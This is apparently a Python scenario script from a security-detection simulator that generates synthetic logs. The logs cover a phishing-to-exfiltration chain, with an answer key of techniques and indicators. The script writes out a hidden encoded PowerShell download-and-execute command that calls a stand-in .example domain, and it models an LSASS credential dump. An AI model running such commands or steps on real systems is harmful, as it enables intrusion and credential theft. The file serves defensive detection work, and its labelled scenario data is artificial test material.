"""s07: the long chain. A macro document leads to an unsigned loader, the loader reads LSASS,
then uses the user's session to pull a Finance share from FS-01 over SMB, packs it into one
archive and uploads it to a storage domain never seen before. Story, one line per step:

1. Outlook saves a .docm attachment; Word opens it.
2. Word starts hidden encoded PowerShell, which downloads an exe from a .example domain.
3. The exe is written to AppData unsigned and started by PowerShell.
4. The exe opens lsass.exe with full access and writes a .dmp to Temp.
5. ~20 minutes later the exe connects to FS-01:445 and the user gets a fresh network logon
   there (users already log on to FS-01 every morning, so the logon alone is normal; the
   process making the connection and the volume pulled are not).
6. The exe writes one large archive to Temp, about the size of what came back from FS-01.
7. The exe resolves a second .example storage domain and uploads the archive over 443.
"""

from scripts.gen.core import fake_sha256, outlook_cache, secs
from scripts.gen.scenario import AlertDraft, Context, Indicator, ScenarioResult, encode_powershell

SCENARIO_ID = "s07"
LURE_DOMAINS = ["hr-docs-portal.example", "payroll-notice.example", "benefits-update.example"]
STORAGE_DOMAINS = ["storage-drop.example", "bulk.cloudvault.example", "sync.archivebay.example"]
LURES = ["Salary_Review_{n}.docm", "Bonus_Letter_{n}.docm", "Benefits_{n}.docm"]
FILE_SERVER = "FS-01"


def inject(ctx: Context) -> ScenarioResult:
    w, rng = ctx.world, ctx.rng
    hostname, user = ctx.pick_desk(("Finance", "HR", "Executive"))
    file_server = ctx.pick([FILE_SERVER])
    d = rng.choice([1, 2, 3])
    s = ctx.session(hostname, d)
    lure_domain = LURE_DOMAINS[(ctx.variant - 1) % len(LURE_DOMAINS)]
    storage_domain = STORAGE_DOMAINS[(ctx.variant - 1) % len(STORAGE_DOMAINS)]
    dl_ip, storage_ip = ctx.bad_ip(0), ctx.bad_ip(1)
    loader_hash = fake_sha256("s07-loader", ctx.variant, dl_ip)
    outlook = s.procs["OUTLOOK.EXE"]
    t = s.start + secs(rng.randint(3600, 3 * 3600))

    # 1. Attachment saved and opened.
    lure = rng.choice(LURES).format(n=rng.randint(1000, 9999))
    doc_path = rf"{outlook_cache(user)}\{ctx.token(8)}\{lure}"
    attachment = w.write_file(
        t,
        outlook,
        user,
        doc_path,
        rng.randint(40_000, 90_000),
        sha256=fake_sha256("s07-doc", dl_ip),
    )
    word = w.start(t + secs(25), hostname, user, "WINWORD.EXE", outlook, rng, f'/n "{doc_path}"')

    # 2-3. Encoded PowerShell fetches and starts the loader.
    exe_name = "OneDriveHelper.exe"
    exe_path = rf"C:\Users\{user}\AppData\Roaming\Microsoft\{exe_name}"
    script = (
        f"$u='http://{lure_domain}/v';$p=\"$env:APPDATA\\Microsoft\\{exe_name}\";"
        "(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p"
    )
    ps = w.start(
        t + secs(41),
        hostname,
        user,
        "powershell.exe",
        word,
        rng,
        f"-NoP -W Hidden -Enc {encode_powershell(script)}",
    )
    lookup = w.dns(t + secs(42), ps, user, lure_domain, dl_ip)
    size = rng.randint(200_000, 380_000)
    download = w.connect(t + secs(43), ps, user, dl_ip, 80, rng.randint(300, 600), size + 420)
    dropped = w.write_file(t + secs(45), ps, user, exe_path, size, sha256=loader_hash)
    loader = w.start(
        t + secs(47), hostname, user, exe_name, ps, rng, path=exe_path, sha256=loader_hash
    )

    # 4. LSASS read with full access, unlike Defender's limited 0x1010 in the background.
    t2 = loader.started().ts + secs(rng.randint(90, 240))
    lsass = w.system[hostname]["lsass.exe"]
    access = w.open_process(t2, loader, user, lsass, "0x1fffff")
    dump_path = rf"C:\Users\{user}\AppData\Local\Temp\{ctx.token(6, '0123456789abcdef')}.dmp"
    dump = w.write_file(t2 + secs(5), loader, user, dump_path, rng.randint(45, 62) * 1_048_576)

    # 5. SMB to the file server, and the matching network logon on FS-01.
    t3 = t2 + secs(rng.randint(18 * 60, 24 * 60))
    pulled = rng.randint(380, 720) * 1_048_576
    smb = w.connect(
        t3, loader, user, w.host(file_server).ip, 445, rng.randint(2, 6) * 1_048_576, pulled
    )
    remote_logon = w.logon(t3, file_server, user, "network", w.host(hostname).ip)

    # 6. Everything packed into one archive.
    archive_path = rf"C:\Users\{user}\AppData\Local\Temp\fin_{ctx.token(4, '0123456789')}.7z"
    archive = w.write_file(
        t3 + secs(rng.randint(240, 420)), loader, user, archive_path, int(pulled * 0.62)
    )

    # 7. Upload to a never-seen storage domain.
    t4 = archive.ts + secs(rng.randint(60, 180))
    storage_lookup = w.dns(t4, loader, user, storage_domain, storage_ip)
    uploads = []
    upload_at = t4 + secs(1)
    remaining = int(pulled * 0.62)
    for _ in range(4):
        chunk = remaining // 4
        uploads.append(
            w.connect(upload_at, loader, user, storage_ip, 443, chunk, rng.randint(20_000, 60_000))
        )
        upload_at += secs(rng.randint(90, 200))

    key = [
        attachment,
        word.started(),
        ps.started(),
        lookup,
        download,
        dropped,
        loader.started(),
        access,
        dump,
        smb,
        remote_logon,
        archive,
        storage_lookup,
        *uploads,
    ]
    return ScenarioResult(
        scenario_id=SCENARIO_ID,
        title="Full chain: phishing, credential theft, file server access, upload",
        verdict="malicious",
        expected_techniques=["T1566.001", "T1059.001", "T1003.001", "T1021.002", "T1567.002"],
        events=ctx.emitted(),
        key_events=key,
        alert=AlertDraft(
            ts=ps.started().ts + secs(2),
            rule="Office application spawned PowerShell",
            severity="high",
            host=hostname,
            user=user,
            description="WINWORD.EXE started powershell.exe with an encoded command line.",
            triggers=[ps.started()],
        ),
        indicators=[
            Indicator(lure_domain, "domain", False, "Malware distribution domain"),
            Indicator(dl_ip, "ip", False, "Download server"),
            Indicator(loader_hash, "hash", True, "Loader with credential-theft module"),
            Indicator(storage_domain, "domain", False, "Cloud storage endpoint"),
            Indicator(storage_ip, "ip", False, "Cloud storage endpoint"),
        ],
    )
